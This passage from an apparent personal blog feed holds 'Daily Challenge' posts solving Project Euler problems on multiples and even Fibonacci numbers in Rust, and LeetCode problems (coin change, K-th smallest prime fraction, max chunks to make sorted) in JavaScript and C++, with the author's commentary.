<span class="keyword">let</span> dp = [<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= amount; ++i)&#123;</span><br><span class="line">    dp.push(<span class="number">0x7F7F7F7F</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">const</span> v <span class="keyword">of</span> coins)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = v; i &lt;= amount; ++i)&#123;</span><br><span class="line">      <span class="keyword">if</span>(dp[i-v]!=<span class="number">0x7F7F7F7F</span> &amp;&amp; dp[i-v] + <span class="number">1</span> &lt; dp[i]) dp[i] = dp[i-v] + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dp[amount] == <span class="number">0x7F7F7F7F</span>? <span class="number">-1</span>: dp[amount];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(coinChange([1, 2, 5],11));</span></span><br><span class="line"><span class="comment">// console.log(coinChange([2],3))</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
            <tag> Factorize </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018-12-22 Daily Challenge</title>
      <link href="/2018-12-22-Daily-Challenge/"/>
      <url>/2018-12-22-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Even Fibonacci numbers</em> in <em>Rust</em> and <em>K-th Smallest Prime Fraction</em> in <em>cpp</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Even Fibonacci numbers</span><br><span class="line"></span><br><span class="line">Problem 2 </span><br><span class="line"></span><br><span class="line">Each new term in the Fibonacci sequence is generated by adding the previous two terms. By starting with 1 and 2, the first 10 terms will be:</span><br><span class="line"></span><br><span class="line">1, 2, 3, 5, 8, 13, 21, 34, 55, 89, ...</span><br><span class="line"></span><br><span class="line">By considering the terms in the Fibonacci sequence whose values do not exceed four million, find the sum of the even-valued terms.</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Of course we can use brute force, the range is still small enough to do it in one second.</p><p>But if we focus on Fibonacci sequence and its beautiful property, we can find more.</p><p>Let&#39;s think about Fibonacci sequence start from index 0 and value 0, which means</p><p>$$F(x)=\left{\begin{matrix} 0,x=0;\1,x=1;\F(x-1)+F(x-2),x&gt;1.\end{matrix}\right.$$</p><img src="/2018-12-22-Daily-Challenge/1545496970479.png" title="RenderFailedMathjax"><p>And if you&#39;re familiar with it, you must know the quickest way to compute Xth numbers is to use quick matrix exponentiation algorithm, which only need asymptotically  $O(xlogx)$.</p><p>And look at the even-valued term, what we can find is ...</p><p><strong>0</strong>, 1, 1, <strong>2</strong>, 3, 5, <strong>8</strong>, 13...</p><p>Emmmmmmmmm, their indices is multiples of 3.</p><p>We should&#39;ve known it, shouldn&#39;t we?</p><p>Because odd add odd is even, odd add even is odd, so pattern goes like</p><p>even, odd, odd, even, odd, odd...</p><p>And if we can find something when we delve into it? Like if we can use only even-valued term to compute next one? Let&#39;s try it.</p><p>$$F_x =  F_{x-1} + F_{x-2}=2F_{x-2} + F_{x-3} = 3F_{x-3}+2F_{x-4}$$</p><p>$$=3F_{x-3}+(F_{x-4}+F_{x-5})+F_{x-6}=4F_{x-3}+F_{x-6}$$</p><p>Which means we could treat our new sequence as a new sequence and its value is</p><p>$$F(x)=\left{\begin{matrix} 0,x=0;\2,x=1;\4F(x-1)+F(x-2),x&gt;1.\end{matrix}\right.$$</p><img src="/2018-12-22-Daily-Challenge/1545497035303.png" title="RenderFailedMathjax1"><p>Also we can compute it with quick matrix exponentiation algorithm.</p><p>Yes, we did it. So we just need to implicate it!</p><hr><p>Sadly saying that I find num_bigint crate is much slower than Python original computation...</p><p>And secondly I find that I&#39;m not capable to write a quick matrix exponentiation in Rust...</p><p>Leave them alone until I can do it...</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_bigint;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_traits;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> num_bigint::&#123;BigUint&#125;;</span><br><span class="line"><span class="keyword">use</span> num_traits::&#123;Zero&#125;;</span><br><span class="line"><span class="keyword">use</span> std::mem::replace;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Used for don't need to delete it...&#123;&#125;"</span>, fib(<span class="number">2</span>));</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Used for don't need to delete it...&#123;&#125;"</span>, fibonacci_recursive(<span class="number">2</span>));</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> x0: <span class="built_in">u64</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> x1: <span class="built_in">u64</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> x2: <span class="built_in">u64</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> sum: <span class="built_in">u64</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> x1 &lt;= <span class="number">4000000</span> &#123;</span><br><span class="line">        x2 = x0 + <span class="number">4</span>*x1;</span><br><span class="line">        x0 = x1;</span><br><span class="line">        x1 = x2;</span><br><span class="line">        sum += x0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"The answer is &#123;&#125;"</span>, sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implication using bigint, but its so slow...</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">fib</span></span>(n: <span class="built_in">usize</span>) -&gt; BigUint &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> f0: BigUint = Zero::zero();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> f1: BigUint = BigUint::parse_bytes(b"<span class="number">2</span><span class="string">", 10).unwrap();</span></span><br><span class="line"><span class="string">    let four: BigUint = BigUint::parse_bytes(b"</span><span class="number">4</span><span class="string">", 10).unwrap();</span></span><br><span class="line"><span class="string">    let mut f2: BigUint;</span></span><br><span class="line"><span class="string">    for _ in 0..n &#123;</span></span><br><span class="line"><span class="string">        f2 = f0 + &amp;four * &amp;f1;</span></span><br><span class="line"><span class="string">        // This is a low cost way of swapping f0 with f1 and f1 with f2.</span></span><br><span class="line"><span class="string">        f0 = replace(&amp;mut f1, f2);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    f0</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fn fibonacci_recursive(n: u64) -&gt; u64 &#123;</span></span><br><span class="line"><span class="string">    let mut x0: u64 = 0;</span></span><br><span class="line"><span class="string">    let mut x1: u64 = 1;</span></span><br><span class="line"><span class="string">    for _ in 0..n&#123;</span></span><br><span class="line"><span class="string">        x1 = x0 + x1;</span></span><br><span class="line"><span class="string">        x0 = x1 - x0;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    x0</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">786. K-th Smallest Prime Fraction</span><br><span class="line"></span><br><span class="line">A sorted list A contains 1, plus some number of primes.  Then, for every p &lt; q in the list, we consider the fraction p/q.</span><br><span class="line"></span><br><span class="line">What is the K-th smallest fraction considered?  Return your answer as an array of ints, where answer[0] = p and answer[1] = q.</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">Input: A = [1, 2, 3, 5], K = 3</span><br><span class="line">Output: [2, 5]</span><br><span class="line">Explanation:</span><br><span class="line">The fractions to be considered in sorted order are:</span><br><span class="line">1/5, 1/3, 2/5, 1/2, 3/5, 2/3.</span><br><span class="line">The third fraction is 2/5.</span><br><span class="line"></span><br><span class="line">Input: A = [1, 7], K = 1</span><br><span class="line">Output: [1, 7]</span><br><span class="line">Note:</span><br><span class="line"></span><br><span class="line">A will have length between 2 and 2000.</span><br><span class="line">Each A[i] will be between 1 and 30000.</span><br><span class="line">K will be between 1 and A.length * (A.length - 1) / 2.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>I think that avoiding computation of fractions is impossible. So time complexity is at least $O(n^2)$.</p><p>And I remembered algorithm that find k-th element with idea of quick sort.</p><p>But I&#39;m wondering if JavaScript is quick enough to get me a AC?</p><hr><p>OK, when I spent my half day fight with JS and I got a MLE......</p><p>Such a depressive experience......</p><p>So I change my implication to cpp and use STL</p><p>TAT</p><p>But I&#39;ll upload my JS code, just for……my wasted time.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; A</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; K</span></span><br><span class="line"><span class="comment"> * @return &#123;number[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> kthSmallestPrimeFraction = <span class="function">(<span class="params">A, K</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> arr = [];</span><br><span class="line">  <span class="keyword">let</span> indexarr = [];</span><br><span class="line">  <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">const</span> value1 <span class="keyword">of</span> A)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">const</span> value2 <span class="keyword">of</span> A)&#123;</span><br><span class="line">      <span class="keyword">if</span>(value2 == value1) <span class="keyword">break</span>;</span><br><span class="line">      arr.push([value2/value1, value2, value1]);</span><br><span class="line">      indexarr.push(i);</span><br><span class="line">      i += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> findkth = <span class="function">(<span class="params">A, bg, ed, K</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> p = partition(A, bg, ed);</span><br><span class="line">    <span class="keyword">if</span>(p == K<span class="number">-1</span>) <span class="keyword">return</span> A[p];</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(p &lt; K<span class="number">-1</span>) <span class="keyword">return</span> findkth(A, p+<span class="number">1</span>, ed, K);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> findkth(A, bg, p<span class="number">-1</span>, K);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">let</span> partition = <span class="function">(<span class="params">A, bg, ed</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> pivot = arr[A[bg]];</span><br><span class="line">    <span class="keyword">let</span> i = bg + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> j = ed;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">      <span class="keyword">while</span>(arr[A[i]] &lt; pivot &amp;&amp; i &lt;= ed) ++i;</span><br><span class="line">      <span class="keyword">while</span>(arr[A[j]] &gt; pivot &amp;&amp; j &gt; bg) --j;</span><br><span class="line">      <span class="keyword">if</span>(i &gt; j) <span class="keyword">break</span>;</span><br><span class="line">      [A[i], A[j]] = [A[j], A[i]];</span><br><span class="line">      ++i;</span><br><span class="line">      --j;</span><br><span class="line">    &#125;</span><br><span class="line">    [A[bg], A[j]] = [A[j], A[bg]];</span><br><span class="line">    <span class="keyword">return</span> j;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// console.log(indexarr);</span></span><br><span class="line">  <span class="comment">// console.log(arr);</span></span><br><span class="line">  <span class="comment">// console.log(i);</span></span><br><span class="line">  <span class="keyword">let</span> a = findkth(indexarr,<span class="number">0</span>,i<span class="number">-1</span>,K);</span><br><span class="line">  <span class="comment">// console.log(arr[a]);</span></span><br><span class="line">  <span class="keyword">return</span> [arr[a][<span class="number">1</span>], arr[a][<span class="number">2</span>]];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(kthSmallestPrimeFraction([1,2,3,5],3));</span></span><br><span class="line"><span class="comment">// console.log(kthSmallestPrimeFraction([1,7],1));</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">s</span> &#123;</span></span><br><span class="line">    <span class="keyword">double</span> val;</span><br><span class="line">    <span class="keyword">int</span> up;</span><br><span class="line">    <span class="keyword">int</span> dn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> s &amp; b) &#123;</span><br><span class="line">        <span class="keyword">return</span> val &lt; b.val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;v[<span class="number">2000000</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">vector</span> &lt; <span class="keyword">int</span> &gt; kthSmallestPrimeFraction(<span class="built_in">vector</span> &lt; <span class="keyword">int</span> &gt; &amp; A, <span class="keyword">int</span> K) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">vector</span> &lt; <span class="keyword">int</span> &gt; ans;</span><br><span class="line">            <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; A.size(); ++i) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; ++j) &#123;</span><br><span class="line">                    v[cnt].val = <span class="number">1.0</span> * A[j] / A[i];</span><br><span class="line">                    v[cnt].up = A[j];</span><br><span class="line">                    v[cnt].dn = A[i];</span><br><span class="line">                    ++cnt;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            nth_element(v, v + K - <span class="number">1</span>, v + cnt);</span><br><span class="line">            <span class="comment">// for(int i=0;i&lt;v.size();++i)&#123;</span></span><br><span class="line">            <span class="comment">//     cout&lt;&lt;v[i].up&lt;&lt;" "&lt;&lt;v[i].dn&lt;&lt;endl;</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            ans.push_back(v[K - <span class="number">1</span>].up);</span><br><span class="line">            ans.push_back(v[K - <span class="number">1</span>].dn);</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
            <tag> Fibonacci </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018-12-21 Daily Challenge</title>
      <link href="/2018-12-21-Daily-Challenge/"/>
      <url>/2018-12-21-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I’ve done today is <em>Multiples of 3 and 5</em> in <em>Rust</em> and <em>Max Chunks To Make Sorted</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Multiples of 3 and 5</span><br><span class="line"></span><br><span class="line">Problem 1 </span><br><span class="line"></span><br><span class="line">If we list all the natural numbers below 10 that are multiples of 3 or 5, we get 3, 5, 6 and 9. The sum of these multiples is 23.</span><br><span class="line"></span><br><span class="line">Find the sum of all the multiples of 3 or 5 below 1000.</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>One way to do it is brute force method, this range is small enough.</p><p>Another way to do it is to come up with a formula which can compute the multiples of a number in constant time, then we should use <a href="https://en.wikipedia.org/wiki/Inclusion%E2%80%93exclusion_principle" target="_blank" rel="noopener">Inclusion–exclusion principle</a> to get the final answer.</p><p>I&#39;ll show you both ways in Rust.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> range = <span class="built_in">String</span>::new();</span><br><span class="line">    io::stdin().read_line(&amp;<span class="keyword">mut</span> range)</span><br><span class="line">        .expect(<span class="string">"Failed to read line"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> range: <span class="built_in">i32</span> = <span class="keyword">match</span> range.trim().parse()&#123;</span><br><span class="line">        <span class="literal">Ok</span>(num) =&gt; num,</span><br><span class="line">        <span class="literal">Err</span>(_) =&gt; <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"&#123;&#125;"</span>, multiples_of_3_and_5(range - <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"&#123;&#125;"</span>, multiples_of_3_and_5_brute(range - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">multiples_of_a_number</span></span>(n: <span class="built_in">i32</span>, d: <span class="built_in">i32</span>) -&gt; <span class="built_in">i32</span> &#123;</span><br><span class="line">    (n / d * d + d) * (n / d) / <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">multiples_of_3_and_5</span></span>(n: <span class="built_in">i32</span>) -&gt; <span class="built_in">i32</span> &#123;</span><br><span class="line">    multiples_of_a_number(n, <span class="number">3</span>) + multiples_of_a_number(n, <span class="number">5</span>) - multiples_of_a_number(n, <span class="number">15</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">multiples_of_3_and_5_brute</span></span>(n: <span class="built_in">i32</span>) -&gt; <span class="built_in">i32</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="number">1</span>..n+<span class="number">1</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> x%<span class="number">3</span> == <span class="number">0</span> || x%<span class="number">5</span>==<span class="number">0</span> &#123;</span><br><span class="line">            ans += x;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">769. Max Chunks To Make Sorted</span><br><span class="line"></span><br><span class="line">Given an array arr that is a permutation of [0, 1, ..., arr.length - 1], we split the array into some number of &quot;chunks&quot; (partitions), and individually sort each chunk.  After concatenating them, the result equals the sorted array.</span><br><span class="line"></span><br><span class="line">What is the most number of chunks we could have made?</span><br><span class="line"></span><br><span class="line">Example 1:</span><br><span class="line"></span><br><span class="line">Input: arr = [4,3,2,1,0]</span><br><span class="line">Output: 1</span><br><span class="line">Explanation:</span><br><span class="line">Splitting into two or more chunks will not return the required result.</span><br><span class="line">For example, splitting into [4, 3], [2, 1, 0] will result in [3, 4, 0, 1, 2], which isn&apos;t sorted.</span><br><span class="line">Example 2:</span><br><span class="line"></span><br><span class="line">Input: arr = [1,0,2,3,4]</span><br><span class="line">Output: 4</span><br><span class="line">Explanation:</span><br><span class="line">We can split into two chunks, such as [1, 0], [2, 3, 4].</span><br><span class="line">However, splitting into [1, 0], [2], [3], [4] is the highest number of chunks possible.</span><br><span class="line">Note:</span><br><span class="line"></span><br><span class="line">arr will have length in range [1, 10].</span><br><span class="line">arr[i] will be a permutation of [0, 1, ..., arr.length - 1].</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><img src="/2018-12-21-Daily-Challenge/SharedImage.png" title="so"><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><p>I come up with an awkward implication:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; arr</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> maxChunksToSorted = <span class="function">(<span class="params">arr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> mx;</span><br><span class="line">  <span class="keyword">let</span> el = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">const</span> [index, value] <span class="keyword">of</span> arr.entries())&#123;</span><br><span class="line">    <span class="keyword">if</span>(!el &amp;&amp; index == value) count += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!el) &#123;</span><br><span class="line">      el = <span class="literal">true</span>;</span><br><span class="line">      mx = value;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (value &gt; mx)&#123;</span><br><span class="line">      mx = value;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(mx == index)&#123;</span><br><span class="line">      count +=<span class="number">1</span>;</span><br><span class="line">      el = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>And got 1A.</p><img src="/2018-12-21-Daily-Challenge/1545314277148.png" title="sub"><p>I&#39;m very happy but when I check the solution page I find a more gentle implication.</p><p>When there is a maintained max indicate the situation, there is no way find a index equal max, but the range [i: max] doesn&#39;t meet the criteria.</p><p>So I improved my implication and beat 100% online submissions, what a cheerful thing!!!</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; arr</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> maxChunksToSorted = <span class="function">(<span class="params">arr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span 